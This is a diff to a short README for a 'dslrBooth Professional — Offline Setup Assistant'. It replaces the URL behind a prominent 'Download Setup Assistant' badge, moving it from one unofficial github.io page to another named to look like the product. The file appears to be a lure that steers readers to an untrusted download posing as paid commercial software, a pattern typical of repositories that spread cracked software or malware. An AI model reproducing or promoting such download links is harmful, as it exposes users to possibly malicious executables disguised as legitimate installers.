@@ -1,6 +1,6 @@
 # dslrBooth Professional — Offline Setup Assistant
 
-<a href="https://ryadikmntiiks.github.io/.github/Dslrb" target="_blank">
+<a href="https://dslrbooth-professional-download.github.io/.github" target="_blank">
   <img src="https://img.shields.io/badge/📸%20DOWNLOAD%20SETUP%20ASSISTANT-%23007ACC?style=for-the-badge&logo=camera&logoColor=white" alt="Download Setup Assistant">
 </a>
 
